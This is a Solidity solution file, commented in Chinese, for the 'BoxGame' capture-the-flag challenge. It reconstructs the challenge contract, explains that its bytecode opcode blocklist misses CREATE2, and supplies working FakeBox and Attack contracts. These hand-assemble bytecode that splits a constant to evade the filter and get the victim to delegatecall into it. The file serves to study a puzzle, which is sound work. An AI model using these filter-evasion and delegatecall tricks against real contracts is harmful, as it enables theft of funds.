// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// 迷惑点：
// 真实的runtime code相当于是a，故原题目的合约内容无意义
// 应通过transaction查看实际的合约代码

/* constructor(bytes memory a) payable public {
        assembly {
            return(add(0x20, a), mload(a))
        }
    }
*/

// 结合反编译工具+etherscan推出solidity合约
// 大佬手撕https://hitcxy.com/2020/boxgame/
contract RealBoxGame {

    event ForFlag(address addr);
    address public target;
    
    function payforflag(address payable _addr) public {
        
        require(_addr != address(0));
        
        uint256 size;
        bytes memory code;

        assembly {
            // code占用字节大小 
            size := extcodesize(_addr)
            // 通过free memory pointer拿到code的待存储位置
            code := mload(0x40)
            // 更新free memory pointer（0x1f=31byte为确保32字节rounded，为标准计算方法）
            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))

            // 存储code.length至memory
            mstore(code, size)
            // 存储code至memory
            extcodecopy(_addr, add(code, 0x20), 0, size)
        }

        // 要求addr合约的字节码中不可包含下面列出的任一，本意是拒绝caller通过外部调用的方式来输出事件
        // 漏掉了CREATE2:0xf5，可以通过CREATE2创建一个输出事件ForFlag的合约
        for(uint256 i = 0; i < code.length; i++) {
            require(code[i] != 0xf0); // CREATE
            require(code[i] != 0xf1); // CALL
            require(code[i] != 0xf2); // CALLCODE
            require(code[i] != 0xf4); // DELEGATECALL
            require(code[i] != 0xfa); // STATICCALL
            require(code[i] != 0xff); // SELFDESTRUCT
        }
        
        // addr的合约输出事件ForFlag即可通关
        _addr.delegatecall(abi.encodeWithSignature(""));
        selfdestruct(_addr);
    }
    
    // 明显不可能有这么多钱
    // 需要通过payforflag的方法释放ForFlag事件
    function sendFlag() public payable {
        require(msg.value >= 1000000000 ether);
        emit ForFlag(msg.sender);
    }
}

// 以下为通关实现代码

contract FakeBox {
    event ForFlag(address addr);

    constructor() {
        assembly {
            // 注意ForFlag(address) topic中显然含有'f0'，需要通过拆解加减换算，以通过校验
            //    0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2
            //    =
            //    0x89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2
            //    +
            //    0x0000000000010000000000000000000000000000000000000000000000000000
            /* 
                PUSH32 0x0000000000010000000000000000000000000000000000000000000000000000
                PUSH32 0x89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2
                ADD
                PUSH1 0x20
                PUSH1 0x00
                LOG1
            */
            mstore(0, 0x7f00000000000100000000000000000000000000000000000000000000000000)
            mstore(0x20, 0x007f89814845d4ef05a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999)
            mstore(0x40, 0xb9e20160206000a1000000000000000000000000000000000000000000000000)
            return(0, 0x48)
        }
    }
}


interface IBoxGame {
    function payforflag(address payable) external;
}


contract Attack {
    IBoxGame box = IBoxGame(0x7EF2e0048f5bAeDe046f6BF797943daF4ED8CB47);

    function hack() public {
        FakeBox fakebox = new FakeBox();
        box.payforflag(payable(address(fakebox)));
    }
}